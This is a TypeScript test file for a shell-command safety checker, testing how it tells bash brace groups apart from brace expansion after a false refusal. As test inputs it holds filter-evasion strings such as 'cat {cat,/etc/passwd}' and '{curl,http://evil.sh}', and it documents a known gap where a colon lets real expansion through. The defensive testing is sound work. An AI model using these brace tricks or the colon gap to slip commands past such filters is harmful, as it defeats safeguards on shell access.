/**
 * #3384: POSIX brace GROUPS were refused as brace EXPANSION.
 *
 * Bash settles the distinction and the test encodes it:
 *   echo {a,b}    -> a b        expansion
 *   echo { a,b }  -> { a,b }    group, no expansion
 * Whitespace after `{` is required for a group and forbidden for expansion, so
 * it is an exact discriminator. The real block was
 * `{ gh pr checks --json name,state,link; break; }` — the comma in a --json
 * field list cleared every other exemption.
 */
import { describe, it, expect } from 'vitest';
import { detectSuspiciousShellFeatures } from '../../lib/normalize-command.js';

const findings = (cmd: string): string[] => detectSuspiciousShellFeatures(cmd);
const flagsBrace = (cmd: string): boolean =>
  findings(cmd).some((f) => f.includes('brace expansion'));

describe('#3384 brace group vs brace expansion', () => {
  it('POSITIVE CONTROL: real brace expansion is still refused', () => {
    // If this ever goes false the exemption has been widened into a hole and
    // every "allowed" case below stops meaning anything.
    expect(flagsBrace('cat {cat,/etc/passwd}')).toBe(true);
    expect(flagsBrace('{curl,wget}')).toBe(true);
  });

  it('allows the brace group that triggered the report', () => {
    expect(
      flagsBrace(`if [ "$F" != "0" ]; then { gh pr checks 3380 --json name,state,link -q '.'; break; }; fi`)
    ).toBe(false);
  });

  it('allows brace groups whose body contains a comma', () => {
    expect(flagsBrace('{ cmd --fields x,y; break; }')).toBe(false);
    expect(flagsBrace('{ echo a,b; }')).toBe(false);
  });

  it('still allows file globs, unchanged', () => {
    expect(flagsBrace('rm -f build/*.{ts,js}')).toBe(false);
    expect(flagsBrace('ls src/**/*.{tsx,jsx}')).toBe(false);
  });

  it('a brace with no space is expansion even when it looks command-ish', () => {
    // NOTE: {gh,pr} is NOT flagged, and that is pre-existing, not this change:
    // a first element of <=2 chars hits the file-extension carve-out. Same for
    // {a,b}. Using a longer token so the assertion tests the brace rule itself.
    expect(flagsBrace('{curl,wget}')).toBe(true);
    expect(flagsBrace('{wget,attacker}')).toBe(true);
  });

  it('KNOWN GAP, unchanged here: a colon exempts real expansion', () => {
    // {curl,http://evil.sh} is genuine brace expansion but the ':' JSON
    // carve-out lets it through. Pre-existing and NOT introduced by #3384 —
    // pinned so the hole is visible rather than folklore.
    expect(flagsBrace('{curl,http://evil.sh}')).toBe(false);
  });
});
